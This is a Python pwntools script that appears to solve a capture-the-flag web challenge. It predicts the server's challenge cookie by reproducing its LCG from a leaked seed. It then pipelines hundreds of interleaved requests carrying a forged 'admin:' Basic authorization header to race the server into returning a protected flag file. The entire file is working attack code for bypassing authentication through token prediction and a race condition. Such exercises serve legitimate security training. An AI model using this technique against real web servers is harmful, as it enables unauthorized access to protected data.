#!/usr/bin/env python3
from pwn import remote, re, context, logging
import time
import threading 

HOST, PORT = "up.zoolab.org", 10933

# LCG constants from the C code
A_const = 6364136223846793005
C_const = 1
SHIFT_const = 33

FLAG_FOUND_VALUE = None
flag_lock = threading.Lock()


def lcg(seed_val):
    mask64 = (1 << 64) - 1
    res = (seed_val * A_const + C_const) & mask64
    return res >> SHIFT_const

def get_seed_and_target_cookie(io):
    req_get_seed = (
        b"GET /secret/FLAG.txt HTTP/1.1\r\n"
        b"Host: up\r\n"
        b"\r\n"
    )
    io.send(req_get_seed)
    
    try:
        response_data = io.recvuntil(b"\r\n\r\n", timeout=5)
        
        content_length_match = re.search(rb"Content-Length: (\d+)", response_data)
        if content_length_match:
            length = int(content_length_match.group(1))
            if length > 0:
                response_data += io.recv(length, timeout=5) 
        
    except Exception as e:
        return None

    seed_match = re.search(rb"Set-Cookie: challenge=(\d+);", response_data)
    if not seed_match:
        return None
        
    seed = int(seed_match.group(1))
    target_cookie = lcg(seed)
    print(f"[*] Target cookie: {target_cookie}")
    return target_cookie

def solve_challenge():
    global FLAG_FOUND_VALUE
    io = remote(HOST, PORT, timeout=10)
    print(f"[*] Connected to {HOST}:{PORT}")

    target_cookie = get_seed_and_target_cookie(io)
    if target_cookie is None:
        io.close()
        return

    # Basic YWRtaW46 is "admin:""
    auth_header = b"Authorization: Basic YWRtaW46\r\n" 

    flag_getter_req_template = (
        b"GET /secret/FLAG.txt HTTP/1.1\r\n"
        b"Host: up\r\n"
        b"Cookie: response={cookie_val}\r\n"
    ) + auth_header + b"\r\n"

    interferer_req = (
        b"GET /index.html HTTP/1.1\r\n" 
        b"Host: up\r\n"
        b"\r\n"
    )

    num_attempts = 200 

    for i in range(num_attempts):
        if FLAG_FOUND_VALUE:
            break

        # Send interferer request (Type P)
        io.send(interferer_req)
        
        # Send flag-getter request (Type F)
        current_flag_req = flag_getter_req_template.replace(b"{cookie_val}", str(target_cookie).encode())
        io.send(current_flag_req)


    print("[*] All requests sent. Now receiving responses...")
    
    # The server serializes full HTTP responses.
    # We sent 2 * num_attempts requests. So expect that many responses.
    for i in range(num_attempts * 2):
        if FLAG_FOUND_VALUE:
            break
        try:
            headers = io.recvuntil(b"\r\n\r\n", timeout=5)
            if not headers:
                break

            body = b""
            content_length_match = re.search(rb"Content-Length: (\d+)", headers)
            if content_length_match:
                length = int(content_length_match.group(1))
                if length > 0:
                    body = io.recv(length, timeout=5)
                    if len(body) != length:
                        continue
            
            full_response = headers + body

            flag_match = re.search(rb"FLAG\{[^ \r\n\}]+\}", full_response)
            if flag_match:
                with flag_lock:
                    FLAG_FOUND_VALUE = flag_match.group(0).decode()
                print(f"\nFLAG FOUND: {FLAG_FOUND_VALUE}")
                break
        except EOFError:
            break
        except Exception as e:
            break
            
    io.close()

if __name__ == "__main__":
    max_overall_attempts = 3 
    for attempt in range(max_overall_attempts):
        print(f"\n--- Attempt {attempt + 1}/{max_overall_attempts} ---")
        FLAG_FOUND_VALUE = None 
        solve_challenge()
        if FLAG_FOUND_VALUE:
            break
        if attempt < max_overall_attempts - 1:
            time.sleep(2) 
    
    if not FLAG_FOUND_VALUE:
        print("\nFailed to retrieve flag.")